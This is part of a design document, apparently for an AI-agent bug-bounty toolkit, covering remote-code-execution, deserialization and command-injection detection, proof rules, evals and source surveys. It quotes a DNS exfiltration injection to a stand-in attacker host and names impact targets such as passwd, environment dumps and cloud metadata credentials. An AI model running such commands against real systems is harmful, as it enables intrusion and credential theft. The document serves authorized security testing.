MARKERS  -> the §13 table, as (pattern, runtime, encoding) with no payloads
scan()   -> reads the existing capture store, zero traffic, seeds (asset, sink, runtime)
sinks    -> (asset_id, location, param, runtime, marker_basis)
chains   -> (sink_id, chain_name, tier)       tier in ("detect", "exploit", "lab-only")
events   -> (chain_id, poe, role, artifact_hash, verdict)
```

`tier` carries ARTEX's LAB-ONLY split: memory-corruption and serializer-confusion
chains are detect-only against a remote target.

### `recon/cmdi.py` — sink ledger

```
LAUNCHERS -> ARTEX alwaysallow_denylist.go:16-44, normalized (basename, lowercase,
             strip trailing version digits)
sinks     -> (asset_id, param, launcher_guess, channel)
channel   -> ("direct", "timing", "dns")
```

Blocked on the Gap 1 predicate for the `timing` channel.

### `.claude/skills/hunt-rce/SKILL.md` — convergence skill

Owns: the PoE ladder, the four evidence roles, the two-binding blind→direct pattern,
`poc_remote`, the one-shot verification rule, the container-impact caveat, the
chain-up ladder. Routes technique to `hunt-ssti`, `hunt-file-upload`,
`hunt-deserialization`, `hunt-command-injection`.

### `.claude/skills/hunt-deserialization/SKILL.md`

Marker table, per-runtime chains, `URLDNS`-first confirmation order, JEP 290,
`__destruct`-on-failure, ViewState and JSF and JNDI as first-class sub-surfaces.

### `.claude/skills/hunt-command-injection/SKILL.md`

Three channels, the filter-bypass ladder, argument injection via the launcher
inventory, shell self-mangling, commix.

---

## 17. Proof binding

New `factcheck` predicate (Gap 1):

```python
"duration_exceeds": {"type", "threshold_ms", "baseline_request_id"}
```

Bindings per sub-class:

| Case | Predicate | PoE |
|---|---|---|
| `ssti-canary` | `body_contains_raw` marker = arithmetic product | 1 |
| `ssti-engine` | `body_contains_raw` marker = `7777777` vs `49` | 2 |
| `rce-marker-direct` | `body_contains_raw` marker = command output | 3 |
| `rce-marker-timing` | `duration_exceeds` vs recorded baseline | 1 |
| `rce-marker-dns` | collaborator interaction record as bound artifact | 3 |
| `deser-sink` | `body_contains_raw` marker = deserializer stack frame | 1 |
| `deser-urldns` | collaborator interaction record | 2 |
| `rce-impact` | `body_contains_raw` × 2 — passwd content **and** env dump | 4 |

The `rce-impact` row is the only one requiring two markers, which is mind-hunt L87
encoded.

---

## 18. Chaining

New `CHAIN_HINTS` rows (findings-driven, per `findings.py:301-305`):

```
file-upload      -> command-injection   uploaded name reaches a media processor argv
file-read        -> deserialization     LFI + session upload_progress = write primitive (php2shell)
deserialization  -> ssrf                JNDI/URLDNS callback proves outbound reach
command-injection-> cloud-metadata      execution -> instance metadata credentials
ssti             -> command-injection   template sandbox escape into a subprocess
js-bundle        -> command-injection   static eval sink reached at runtime
```

New `STEP_CHAINS` entries alongside the existing `ssti-exec`:

- `lfi-session-exec` — the php2shell chain, with its timing step explicit
- `upload-processor-exec` — upload → media processor argv → marker
- `deser-blind-then-direct` — the two-binding ARTEX pattern as a named chain
- `exec-metadata-cloud` — execution → `/proc/self/environ` + metadata → cloud

---

## 19. Wiring

- `recon/skillmap.py` — two `SKILLS_FOR_CLASS` routes, two `SEEDED_BY` entries,
  `hunt-rce` reachable from four classes.
- `recon/catalog.py` — three new `HUNT_SKILLS` entries (22 → 25).
- `tests/test_recon_skills.py` — `ORIGINAL_HUNT_SKILLS:29` += 3 (the two set-equality
  assertions at `:105-106` and `:112-113` then pass without edits); the one hardcoded
  count, `len(skill_dirs())` at `:158`, moves **30 → 33**.
- `tests/test_recon_seeders.py` — `deserialization` and `command-injection` added to
  the seeded-and-routed assertions; seeded-but-unrouted set stays
  `{"file-read", "open-redirect"}`.
- `recon/factcheck.py` — fifth predicate, `CHECKER_VERSION` bump.
- `recon/policy.py` + `recon/scope.py` — `callback_hosts`, and a send-path check that
  refuses an undeclared embedded callback domain.
- `AGENTS.md` — a paragraph per new class in the house style, stating that the ledgers
  are offline, that `executed` is artifact-backed, and that LAB-ONLY chains are
  detect-only.

---

## 20. Evals

| Eval | Asserts |
|---|---|
| `poe-floor` | PoE 1-2 never promotes past `lead`; PoE 3 requires a bound quote |
| `quote-verbatim` | a quote of <8 runes, or one not present verbatim, fails verification |
| `fail-closed-body` | non-text, unreadable and >4 MiB bodies yield `not_assessed`, never `verified` |
| `stacked-coding` | an unknown or stacked content-coding errors rather than matching raw bytes |
| `timing-baseline` | `duration_exceeds` without a baseline request is rejected |
| `two-binding` | a blind `proof` with no independent `verification` stays `lead` |
| `marker-not-execution` | upload `accepted`/`stored`/`processed`/`served` never imply `executed` |
| `arithmetic-not-exec` | SSTI `49` alone never reaches PoE 3 |
| `engine-disambiguation` | `7777777` classifies Jinja2, `49` classifies Twig, neither alone proves execution |
| `lab-only-tier` | a chain tiered `lab-only` cannot record a live exploit event |
| `callback-declared` | a payload with an undeclared callback domain is refused pre-send |
| `poc-remote` | a case whose only evidence came from an existing shell is not reportable |
| `container-impact` | PoE 4 requires two distinct impact markers |
| `destruct-on-failure` | a deserializer error does not close the sink's chains |
| `no-payload-literals` | `deser.py` and `cmdi.py` contain no payload strings |

---

## 21. Build order

1. **`recon/execproof.py`** plus its evals, and refactor `upload.py:152` and
   `ssti.py:556` to call it. No new class, no traffic — pure consolidation, and it
   makes the two existing guards agree.
2. **`factcheck.py` fifth predicate** (`duration_exceeds`) with the baseline rule and
   `CHECKER_VERSION` bump. Unblocks the timing channel.
3. **`policy.callback_hosts` + scope check.** Unblocks the DNS channel.
4. **`recon/deser.py` passive seeder.** Reads the existing store, sends nothing. First
   new class, and the cheapest — markers are already sitting in captures.
5. `hunt-deserialization` skill + catalog + skillmap, landed together.
6. **`recon/cmdi.py`** sink ledger with the launcher inventory.
7. `hunt-command-injection` skill + catalog + skillmap.
8. **`hunt-rce` convergence skill**, last — it routes to the others, so it lands after
   they exist.
9. Chain rows and `STEP_CHAINS`.
10. SSTI engine-disambiguation addition to `hunt-ssti`.
11. `file_upload_bypass.md` harvest into `hunt-file-upload` (`.htaccess` / `web.config`
    handler override, phar polyglot, Zip-slip).
12. CI/CD surface into `hunt-cloud-misconfig`.

Steps 1-4 touch no target. Step 4 sends nothing at all.

---

## 22. Other sources — what each contributes

### HackTricks — the deepest set in this effort

186 KB deserialization across 11 files, plus three execution sinks no other source
carries (XSLT 16.6 KB, SSI/ESI 12.9 KB, formula/LaTeX 12 KB) and
`command-injection.md` 7.9 KB. Unique within the source set: JNDI/Log4Shell,
ASP.NET ViewState (×2), JSF ViewState, GadgetProbe DNS detection, PyYAML, .NET
ObjectDataProvider/Json.NET gadgets.

### mind-hunt — the router

102 lines. Seven ranked sub-classes, the disclosed-bounty table, the WAF canary
discipline, the container-impact caveat, the Flask debug PIN derivation. Thin on
technique, strong on judgement and prioritisation.

### ARTEX — proof mechanics

PoE 0-4 ladder, machine-checked verification, four evidence roles, ~150-program
execution-primitive inventory, `php2shell` LFI→RCE chain with its timing step,
LAB-ONLY tiering, `poc_remote`, retest-with-control, `codeaudit` static phases and
the `static-analysis-unexecuted` label.

**Zeros:** SSTI (repo-wide `7*7` = 0 hits; jinja/twig/freemarker/velocity = 0);
Java/Python/Ruby/Node deserialization (`ysoserial`/`marshalsec`/`phpggc`/`pickle`/
`readObject` = 0, no magic markers); media-processor command injection
(`ImageMagick`/`ffmpeg`/`gm convert` = 0); eval-sink pattern library; webshell
extension-bypass tables; CI/CD as doctrine. **OOB infrastructure: zero** — no
collaborator, interactsh, dnslog or callback receiver anywhere, which is why its
body-only quote rule must not be copied.

### PentAGI — execution mechanics

Second contribution in eleven classes. The time-based cmdi oracle with `${IFS}`
bypasses, the detach rule for listeners, callback preconditions including the
context-compaction warning, shell self-mangling, the callback-domain scope gate,
pipeline-definition injection.

**Zeros:** SSTI, deserialization, media-processor RCE, eval sinks, any payload library,
and any constraint on claiming proven execution — its prompts run the other way and
exist to strip hedging.

### BugBountySkills — one real lineage, one hollow

`SKILL_FILES/` is genuinely useful: the `{{7*'7'}}` engine disambiguator, 9+ engine
payload sets, modern Jinja2 gadgets, the `attr()` filter-bypass ladder, .NET `AAEAAA`,
`URLDNS` blind confirmation, the cmdi filter-bypass ladder,
`nslookup $(whoami).attacker.tld`, XSLT RCE, the upload bypass ladder, the modern
CI/CD surface.

`KNOWLEDGE_BASE/` is machine-templated filler — proven by 121-line files differing in
12 line-pairs across unrelated classes, regex-scraped "payloads", a path-traversal
string presented as five distinct RCE bypasses, XSS prose in an RCE theory file, and a
leaked Python ternary in the README. Metadata is not a quality signal at any value.

`reports-index.md` is usable as a 495-ID seed list only. `REFERENCE/source_pdfs_text/`
holds copyrighted books and is excluded.

---

## Sources

- mind-hunt (local, MIT, © 2026 MindflareX) — `skills/hunt-rce/SKILL.md`,
  SHA-256 `cff36310133626926bd0041e35f92611...`
- https://github.com/b4rdia/HackTricks/tree/master/pentesting-web/deserialization
- https://github.com/b4rdia/HackTricks/blob/master/pentesting-web/command-injection.md
- https://github.com/b4rdia/HackTricks/blob/master/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md
- https://github.com/b4rdia/HackTricks/blob/master/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.md
- https://github.com/b4rdia/HackTricks/blob/master/pentesting-web/formula-doc-latex-injection.md
- https://github.com/BaaRai/ARTEX — `server/orchestration.go:457`,
  `server/finding_verification.go:21-31,140-197`,
  `intercept/alwaysallow_denylist.go:16-44`, `intercept/prompt.go:50-128`,
  `skills/php2shell/SKILL.md`, `skills/codeaudit/SKILL.md`,
  `skills/patch-diff/SKILL.md`, `agent/retester.go:8-11`,
  `scripts/submission_review/README.md`, `docs/rsi-lessons.md`
- https://github.com/vxcontrol/pentagi — `backend/pkg/templates/prompts/pentester.tmpl`,
  `examples/prompts/base_web_pentest.md:35-40`,
  `examples/prompts/scope_of_work_pentest.md:66-76`
- https://github.com/0xN0RMXL/BugBountySkills — `SKILL_FILES/` only;
  `KNOWLEDGE_BASE/` and `REFERENCE/source_pdfs_text/` excluded
- `vault/_data/reports-merged.csv` — 650 `rce` rows of 15,443
